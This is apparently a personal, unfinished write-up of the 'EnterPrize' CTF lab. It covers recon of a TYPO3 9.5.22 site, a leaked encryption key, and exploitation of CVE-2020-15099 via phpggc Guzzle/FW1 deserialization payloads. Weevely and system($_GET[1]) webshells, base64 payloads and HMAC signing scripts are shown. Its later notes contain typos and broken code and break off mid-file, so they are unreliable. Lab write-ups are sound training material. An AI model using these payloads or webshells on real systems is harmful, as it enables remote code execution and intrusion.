<h1>EnterPrize</h1>
<p>2025, August 2 - Day 453</p>


<img width="1902" height="307" alt="image" src="https://github.com/user-attachments/assets/8140e461-ae83-43c6-8b74-326c4dcc399d" />

<br>
<br>

```bash
:~/Enterprize# nmap -p- xx.xx.xx.xx
...
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
```

<img width="989" height="247" alt="image" src="https://github.com/user-attachments/assets/c940f171-d1a4-4eb4-9ad7-cb721abde9a6" />

<br>
<br>

```bash
nmap -sC -sV -Pn -p22,80,443 -T4 xx.xx.xx.xx
...
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp  open   http    Apache httpd
|_http-server-header: Apache
|_http-title: Blank Page
443/tcp closed https
```

<img width="1072" height="338" alt="image" src="https://github.com/user-attachments/assets/62177242-2dd6-49c8-972a-52cfd210db5a" />

<br>
<br>

```bash
xx.xx.xx.xx    enterprize.thm
```

<p> Web exntensions:
  
- html<br>
- phps</p>

```bash
:~/Enterprize# ffuf -u http://enterprize.thm/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
...
.phps                   [Status: 403, Size: 199, Words: 14, Lines: 8]
.html                   [Status: 200, Size: 85, Words: 5, Lines: 2]
```

<img width="1071" height="378" alt="image" src="https://github.com/user-attachments/assets/dcba405c-fb78-4911-80ee-a11ef8fff57a" />

<br>
<br>
<p>

- public<br>
- vendor<br>
- var<br>
- server-status</p>

```bash
:~/EnterPrize# :~/Enterprize# ffuf -u http://enterprize.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -mc all -t 80 -fs 196
...
var                     [Status: 403, Size: 199, Words: 14, Lines: 8]
public                  [Status: 403, Size: 199, Words: 14, Lines: 8]
vendor                  [Status: 403, Size: 199, Words: 14, Lines: 8]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
                        [Status: 200, Size: 85, Words: 5, Lines: 2]
```

<img width="1076" height="448" alt="image" src="https://github.com/user-attachments/assets/93094bfd-1549-4ba2-b7d5-2b852a09622d" />

<br>
<br>

```bash
:~/Enterprize# dirb http://enterprize.thm
...                                                   
---- Scanning URL: http://enterprize.thm/ ----
+ http://enterprize.thm/index.html (CODE:200|SIZE:85)                                                                                                        
+ http://enterprize.thm/public (CODE:403|SIZE:199)                                                                                                           
+ http://enterprize.thm/server-status (CODE:403|SIZE:199)                                                                                                    
+ http://enterprize.thm/var (CODE:403|SIZE:199)                                                                                                              
+ http://enterprize.thm/vendor (CODE:403|SIZE:199)                                                                               
```

<img width="1069" height="378" alt="image" src="https://github.com/user-attachments/assets/109cc85a-774b-4a51-87aa-9a021811a33a" />

<br>
<br>
<p><code>enterprize.thm</code> and <code>enterprize.thm/index.html</code></p>

<img width="1129" height="183" alt="image" src="https://github.com/user-attachments/assets/c6cc576a-dd82-4204-bff7-15c8a333e712" />


<p><code>enterprize.thm/composer.json</code></p>

<p>superhero1/enterprize</p>

<img width="1152" height="298" alt="image" src="https://github.com/user-attachments/assets/1d931071-a57c-4a94-b31c-9199408d5601" />


<img width="1128" height="420" alt="image" src="https://github.com/user-attachments/assets/d3615b33-0105-4082-a28e-1139662bd668" />


<br>
<br>
<br>
<p></p><code>maintest.enterprize.thm</code></p>

```bash
:~/Enterprize# ffuf -u http://enterprize.thm/ -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.enterprize.thm' -fs 85
...
maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49]
```

<img width="1157" height="408" alt="image" src="https://github.com/user-attachments/assets/834c0e2d-6d73-4bce-bdd2-6445f1a3499b" />

<br>
<br>
<br>

```bash
xx.xx.xx.xx   enterprize.thm  maintest.enterprize.thm
```

<p>WhatWeb</p>

```bash
:~/EnterPrize# apt install whatweb
```

```bash
:~/EnterPrize#  git clone https://github.com/urbanadventurer/WhatWeb.git
...
:~/EnterPrize# cd WhatWeb
:~/EnterPrize/WhatWeb# ls
addons        Gemfile  INSTALL.md  LICENSE   my-plugins          plugins           Rakefile   test     whatweb.1
CHANGELOG.md  icons    lib         Makefile  plugin-development  plugins-disabled  README.md  whatweb  whatweb.xsl
```

<p>TYPO3 9.5.22</p>

```bash
:~/EnterPrize/WhatWeb# ./whatweb http://maintest.enterprize.thm --plugins typo3 --aggression 3
http://maintest.enterprize.thm [200 OK] TYPO3[9.5.22]
```

```bash
:~/EnterPrize/Typo3Scan# ffuf -u http://maintest.enterprize.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -mc all -fs 196 -t 80
...
typo3                   [Status: 301, Size: 245, Words: 14, Lines: 8]
fileadmin               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3conf               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3temp               [Status: 301, Size: 249, Words: 14, Lines: 8]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
                        [Status: 200, Size: 24555, Words: 1438, Lines: 49
```

<p>maintest.enterprize.thm</p>

<img width="1132" height="543" alt="image" src="https://github.com/user-attachments/assets/c6f53c06-8884-4339-8cd5-94471ce748a1" />

<br>
<p>maintest.enterprize.thm/index.php</p>

<img width="1157" height="702" alt="image" src="https://github.com/user-attachments/assets/3cc51aa1-90ee-44b4-8eb5-6bcc5b9e96ba" />

<img width="1157" height="693" alt="image" src="https://github.com/user-attachments/assets/8e1ca781-52e3-43e3-a839-61a6c075047d" />

<br>
<p>www.bootstrap-package.com</p>

<img width="1156" height="696" alt="image" src="https://github.com/user-attachments/assets/7b3af00e-bd7d-4822-b02c-9e36ec1ec85e" />

<br>
<p>maintest.enterprize.thm/index.php?id=81</p>

<img width="1154" height="133" alt="image" src="https://github.com/user-attachments/assets/bd6d0d5c-3f06-48dd-b793-6ab396e85d8d" />

<br>
<p>maintest.enterprize.thm/index.php?id=38</p>

<img width="1094" height="817" alt="image" src="https://github.com/user-attachments/assets/dd813bab-884b-42ae-abc9-87321befc194" />

<img width="1082" height="809" alt="image" src="https://github.com/user-attachments/assets/7381ce80-7d6a-42a8-95fe-5b54ba82bcdc" />

<img width="1078" height="742" alt="image" src="https://github.com/user-attachments/assets/b79ae6dd-acb7-4ded-a0d9-b67e7b9dea6a" />

<img width="1070" height="314" alt="image" src="https://github.com/user-attachments/assets/87e97423-4cfb-4d92-ad1e-f7ac2a914379" />


```bash
O:39:"TYPO3\CMS\Form\Domain\Runtime\FormState":2:{s:25:"*lastDisplayedPageIndex";i:0;s:13:"*formValues";a:0:{}}
```

```bash
:~/EnterPrize# apt install weevely
```

<br>
<p>rose-agent.php</p>

```bash
:~/Enterprize# weevely generate rose rose-agent.php
Generated 'rose-agent.php' with password 'rose' of 751 byte size.
```

```bash
:~/Enterprize# git clone https://github.com/ambionics/phpggc
Cloning into 'phpggc'...
...
```

```bash
:~/Enterprize/phpggc# ls
Dockerfile  gadgetchains  lib  LICENSE  phpggc  README.md  templates  test-gc-compatibility.py
```

```bash
:~/Enterprize/phpggc# ./phpggc -l Guzzle

Gadget Chains
-------------

NAME                     VERSION                         TYPE                  VECTOR        I    
Guzzle/FW1               4.0.0-rc.2 <= 7.5.0+            File write            __destruct         
Guzzle/INFO1             6.0.0 <= 6.3.2                  phpinfo()             __destruct    *    
Guzzle/RCE1              6.0.0 <= 6.3.2                  RCE: Function Call    __destruct    *    
Pydio/Guzzle/RCE1        < 8.2.2                         RCE: Function Call    __toString         
WordPress/Guzzle/RCE1    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __toString    *    
WordPress/Guzzle/RCE2    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __destruct    *    
```

```bash
:~/Enterprize/phpggc# ./phpggc -i Guzzle/FW1
Name           : Guzzle/FW1
Version        : 4.0.0-rc.2 <= 7.5.0+
Type           : File write
Vector         : __destruct

./phpggc Guzzle/FW1 <remote_path> <local_path>
```

```bash
712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b
```

```bash
:~/Enterprize/phpggc# hashid 712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b
Analyzing '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b'
[+] SHA-384 
[+] SHA3-384 
[+] Skein-512(384) 
[+] Skein-1024(384) 
```

<br>
<p>a.php</p>

```bash
:~/Enterprize/phpggc# nano a.php
```

```bash
<?php
$sig = hash_hmac('sha384', $argv[1], "712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b");
print($sig);
?>
```

```bash
:~/Enterprize/phpggc# php ./phpgcc --base64 --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/rose-agent.php /root/Enterprize/phpggc/rose-agent.php > payload.txt
```

```bash
:~/Enterprize/phpggc# cat /root/Enterprize/phpggc/payload.txt| openssl dgst -sha1 -hmac '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b'
(stdin)= 58418e36b7c91a8b6a2f0eef51b4c7e204f1e4f4
```

```bash
:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/backdoor.php /root/Enterprize/phpggc/a.php
?????
```

<img width="1074" height="740" alt="image" src="https://github.com/user-attachments/assets/e1edb390-a35f-412b-8b9c-35a116b862da" />

```bash
a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:".GuzzleHttp\Cookie\FileCookieJar.filename";s:50:"/var/www/html/public/fileadmin/_temp_/a.php";s:52:".GuzzleHttp\Cookie\FileCookieJar.storeSessionCookies";b:1;s:36:".GuzzleHttp\Cookie\CookieJar.cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>
";}}}s:39:".GuzzleHttp\Cookie\CookieJar.strictMode";N;}i:7;i:7;}
```

<img width="1077" height="736" alt="image" src="https://github.com/user-attachments/assets/09da90ec-ee9c-4783-a036-dacadd531b7c" />



<br>
<p>maintest.enterprize.thm/typo3/</p>

<img width="1129" height="500" alt="image" src="https://github.com/user-attachments/assets/d72fb7b7-c69b-4e01-b542-45e8c21d7099" />

<br>
<p>maintest.enterprize.thm/typo3conf/</p>

<p>

- LocalConfiguration.old<br>
- LocalConfiguration.php<br>
- PackgeStates.php<br>
- ext/<br>
- l10n/<br>
</p>

<p>

- 'installToolPassword' => '$argon2i$v=19$m=65536,t=16,p=', //removed hash for security!!<br>
- passwordHashing' => ['className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash<br>
- 'dbname' => 'typo3'<br>
- 'driver' => 'mysqli'<br>
- 'host' => '127.0.0.1'<br>
- 'password' => 'password1', //replaced old password by 24 random chars & symbols<br>
- 'port' => 3306<br>
- 'encryptionKey' => '<code>712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b</code>',
</p>

<img width="1126" height="412" alt="image" src="https://github.com/user-attachments/assets/e55cb545-8c7e-4641-a5f6-0115ea2cd943" />

```bash
(venv) :~/EnterPrize# cat LocalConfiguration.old
<?php
return [
    'BE' => [
        'debug' => false,
        'explicitADmode' => 'explicitAllow',
        'installToolPassword' => '$argon2i$v=19$m=65536,t=16,p=', //removed hash for security!!
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'DB' => [
        'Connections' => [
            'Default' => [
                'charset' => 'utf8mb4',
                'dbname' => 'typo3',
                'driver' => 'mysqli',
                'host' => '127.0.0.1',
                'password' => 'password1', //replaced old password by 24 random chars & symbols
                'port' => 3306,
                'tableoptions' => [
                    'charset' => 'utf8mb4',
                    'collate' => 'utf8mb4_unicode_ci',
                ],
                'user' => 'typo3user',
            ],
        ],
    ],
    'EXT' => [
        'extConf' => [
            'backend' => 'a:6:{s:14:"backendFavicon";s:0:"";s:11:"backendLogo";s:0:"";s:20:"loginBackgroundImage";s:0:"";s:13:"loginFootnote";s:0:"";s:19:"loginHighlightColor";s:0:"";s:9:"loginLogo";s:0:"";}',
            'bootstrap_package' => 'a:8:{s:20:"disableCssProcessing";s:1:"0";s:17:"disableFontLoader";s:1:"0";s:24:"disableGoogleFontCaching";s:1:"0";s:27:"disablePageTsBackendLayouts";s:1:"0";s:28:"disablePageTsContentElements";s:1:"0";s:16:"disablePageTsRTE";s:1:"0";s:20:"disablePageTsTCEFORM";s:1:"0";s:20:"disablePageTsTCEMAIN";s:1:"0";}',
            'extensionmanager' => 'a:2:{s:21:"automaticInstallation";s:1:"1";s:11:"offlineMode";s:1:"0";}',
            'indexed_search' => 'a:20:{s:8:"pdftools";s:9:"/usr/bin/";s:8:"pdf_mode";s:2:"20";s:5:"unzip";s:9:"/usr/bin/";s:6:"catdoc";s:9:"/usr/bin/";s:6:"xlhtml";s:9:"/usr/bin/";s:7:"ppthtml";s:9:"/usr/bin/";s:5:"unrtf";s:9:"/usr/bin/";s:18:"trackIpInStatistic";s:1:"2";s:9:"debugMode";s:1:"0";s:18:"fullTextDataLength";s:1:"0";s:23:"disableFrontendIndexing";s:1:"0";s:21:"enableMetaphoneSearch";s:1:"1";s:6:"minAge";s:2:"24";s:6:"maxAge";s:1:"0";s:16:"maxExternalFiles";s:1:"5";s:26:"useCrawlerForExternalFiles";s:1:"0";s:11:"flagBitMask";s:3:"192";s:16:"ignoreExtensions";s:0:"";s:17:"indexExternalURLs";s:1:"0";s:16:"useMysqlFulltext";s:1:"0";}',
        ],
    ],
       'EXTENSIONS' => [
        'backend' => [
            'backendFavicon' => '',
            'backendLogo' => '',
            'loginBackgroundImage' => '',
            'loginFootnote' => '',
            'loginHighlightColor' => '',
            'loginLogo' => '',
        ],
        'bootstrap_package' => [
            'disableCssProcessing' => '0',
            'disableFontLoader' => '0',
            'disableGoogleFontCaching' => '0',
            'disablePageTsBackendLayouts' => '0',
            'disablePageTsContentElements' => '0',
            'disablePageTsRTE' => '0',
            'disablePageTsTCEFORM' => '0',
            'disablePageTsTCEMAIN' => '0',
        ],
        'extensionmanager' => [
            'automaticInstallation' => '1',
            'offlineMode' => '0',
        ],
        'indexed_search' => [
            'catdoc' => '/usr/bin/',
            'debugMode' => '0',
            'disableFrontendIndexing' => '0',
            'enableMetaphoneSearch' => '1',
            'flagBitMask' => '192',
            'fullTextDataLength' => '0',
            'ignoreExtensions' => '',
            'indexExternalURLs' => '0',
            'maxAge' => '0',
            'maxExternalFiles' => '5',
            'minAge' => '24',
            'pdf_mode' => '20',
            'pdftools' => '/usr/bin/',
            'ppthtml' => '/usr/bin/',
            'trackIpInStatistic' => '2',
            'unrtf' => '/usr/bin/',
            'unzip' => '/usr/bin/',
            'useCrawlerForExternalFiles' => '0',
            'useMysqlFulltext' => '0',
            'xlhtml' => '/usr/bin/',
        ],
    ],
    'FE' => [
        'debug' => false,
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'LOG' => [
        'TYPO3' => [
            'CMS' => [
                'deprecations' => [
                    'writerConfiguration' => [
                        5 => [
                            'TYPO3\CMS\Core\Log\Writer\FileWriter' => [
                                'disabled' => true,
                            ],
                        ],
                    ],
                ],
            ],
        ],
    ],
    'MAIL' => [
        'transport' => 'sendmail',
        'transport_sendmail_command' => '/usr/sbin/sendmail -t -i ',
        'transport_smtp_encrypt' => '',
        'transport_smtp_password' => '',
        'transport_smtp_server' => '',
        'transport_smtp_username' => '',
    ],
  'SYS' => [
        'devIPmask' => '',
        'displayErrors' => 0,
        'encryptionKey' => '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b',
        'exceptionalErrors' => 4096,
        'features' => [
            'newTranslationServer' => true,
            'unifiedPageTranslationHandling' => true,
        ],
        'sitename' => 'EnterPrize',
        'systemLogLevel' => 2,
        'systemMaintainers' => [
            1,
        ],
    ],
];
```

<br>
<p>http://maintest.enterprize.thm/typo3conf/ext/introduction/Documentation/Settings.cfg</p>

<img width="1050" height="375" alt="image" src="https://github.com/user-attachments/assets/373b73cb-32f6-48ae-a760-d7df0fc13afc" />

<br>
<p>github.com/FriendsOfTYPO3/introduction/issues</p>

<img width="1153" height="688" alt="image" src="https://github.com/user-attachments/assets/01ca2a57-1890-4414-b018-e485c8495211" />



<h3 align="center">CVE-2020-15099</h3>
<p = align="center">TYPO3 CMS Arbitrary File Disclosure and Remote Code Execution</p>

<br>

<h3>http://maintest.enterprize.thm/index.php?id=38</h3>

<img width="1242" height="851" alt="image" src="https://github.com/user-attachments/assets/9467681f-72a0-4646-8853-e6da7f148f44" />

<br>

<h3>phpggc</h3>

```bash
(venv) :/tmp/phpgcc# git clone https://github.com/ambionics/phpggc
...
```

```bash
(venv) :/tmp/phpgcc# ./phpggc -l Guzzle

Gadget Chains
-------------

NAME                     VERSION                         TYPE                  VECTOR        I    
Guzzle/FW1               4.0.0-rc.2 <= 7.5.0+            File write            __destruct         
Guzzle/INFO1             6.0.0 <= 6.3.2                  phpinfo()             __destruct    *    
Guzzle/RCE1              6.0.0 <= 6.3.2                  RCE: Function Call    __destruct    *    
Pydio/Guzzle/RCE1        < 8.2.2                         RCE: Function Call    __toString         
WordPress/Guzzle/RCE1    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __toString    *    
WordPress/Guzzle/RCE2    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __destruct    *  
```

```bash
(venv) :/tmp/phpgcc# ./phpggc -l Guzzle/FW1

Gadget Chains
-------------

NAME          VERSION                 TYPE          VECTOR        I    
Guzzle/FW1    4.0.0-rc.2 <= 7.5.0+    File write    __destruct         
```

<h3>m3.php</h3>

```bash
<?php $output = system($_GET[1]); echo $output ; ?>
```

<h3>phpgcc</h3>

```bash
:~/EnterPrize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/backdoor.php /root/EnterPrize/phpggc/m3.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==
```

```bash
:~/EnterPrize/phpggc# cat hash_hmac.php
<?php
echo hash_hmac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==', '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
?>
```

```bash
:~/EnterPrize/phpggc# php hash_hmac.php
61185e34fa209a475442a285fce1a42dbaca0c1c
```


<h3>CyberChef</h3>

<img width="1351" height="402" alt="image" src="https://github.com/user-attachments/assets/e703c618-9c29-4375-9d3f-bc6f90ef97c3" />


```bash
a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:".GuzzleHttp\Cookie\FileCookieJar.filename";s:50:"/var/www/html/public/fileadmin/_temp_/backdoor.php";s:52:".GuzzleHttp\Cookie\FileCookieJar.storeSessionCookies";b:1;s:36:".GuzzleHttp\Cookie\CookieJar.cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>
";}}}s:39:".GuzzleHttp\Cookie\CookieJar.strictMode";N;}i:7;i:7;}
```



<h3>hmac.php</h3>

```bash
cat hmac.php
<?php
$secret = hash_mac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjI2OiI8P3BocCBzeXN0ZW0oJF9HRVRbMV0pOz8+CiI7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO31pOjc7aTo3O30=', ' '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
print($secret);
?>
```


./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/fileadmin/_temp_/exp.php 


<p>----------------------------------</p>
<p>2025, October 26</p>

<img width="1061" height="442" alt="image" src="https://github.com/user-attachments/assets/7462dd75-6c3b-4712-80bc-b7412f7f7342" />



<?php
$sig = hash_hmac('sha384', $argv[1], "712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b");
print($sig);
?>




:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/wwww/html/public/fileadmin/_temp_/backdoor.php /root/Enterprize/phpggc/aux.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTE6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2JhY2tkb29yLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO3M6MzY6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAY29va2llcyI7YToxOntpOjA7TzoyNzoiR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llIjoxOntzOjMzOiIAR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llAGRhdGEiO2E6Mzp7czo3OiJFeHBpcmVzIjtpOjE7czo3OiJEaXNjYXJkIjtiOjA7czo1OiJWYWx1ZSI7czoyNjoiPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9


HMAC  SHA1



SHA1 : 4c21422bd05aaaaff87defd1016c7b203399270e

:~/Enterprize/phpggc# cat aux.php
<?php system($_GET[1]);?>


# cat aux.js
a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"GuzzleHttp\Cookie\CookieJarCookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>";}}}s:39:".GuzzleHttp\Cookie\CookieJarstrictMode";N;s:41:"GuzzleHttp\Cookie\FileCookieJarFilnemae";s:50:"/var/html/public/fileadmin/_temp_/backdoor.php";s:52:"GuzzleHttp\Cookie\FileCookieSessionCookies";b:1;}i:7;i:7;}



:~/Enterprize/phpggc# cat aux.php
<?php $output = system($_GET[1]); echo $output ; ?>



:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/wwww/html/public/fileadmin/_temp_/aux.php /root/Enterprize/phpggc/aux.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDY6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2F1eC5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjM6e3M6NzoiRXhwaXJlcyI7aToxO3M6NzoiRGlzY2FyZCI7YjowO3M6NToiVmFsdWUiO3M6NTI6Ijw/cGhwICRvdXRwdXQgPSBzeXN0ZW0oJF9HRVRbMV0pOyBlY2hvICRvdXRwdXQgOyA/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9



:~/Enterprize/phpggc# cat script.php
<?php
